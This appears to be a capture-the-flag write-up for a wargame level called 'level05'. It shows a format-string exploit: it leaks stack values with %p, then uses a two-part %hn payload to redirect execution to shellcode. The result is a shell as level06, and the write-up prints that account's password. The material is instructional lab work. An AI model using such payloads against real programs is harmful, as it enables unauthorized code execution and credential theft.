# level05

```sh
$> python -c 'print("aaaa " + "%p "*100)' | ./level05
aaaa 0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd6b4 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
```

We can count that the string `aaaa` occurs at the 10th position in the stack.


Shellcode's address: 0xffffd868


Because this value is too large for a 32-bit integer, we have to use a trick to write this address in the stack.  
We will decompose it in 2 parts and use `%hn` specifier :
- `0xffff`: 65535
- `0xd868`: 55400

The `%n` specifier will first write 55400 bytes, then we will write the difference with the second part of the address.

```
65535 - 55400 = 10135
```

We can write our payload :
```sh
$> (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55392d" + "%10$hn" + "%10135d%11$hn")'; cat) | ./level05
$ whoami
level06
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
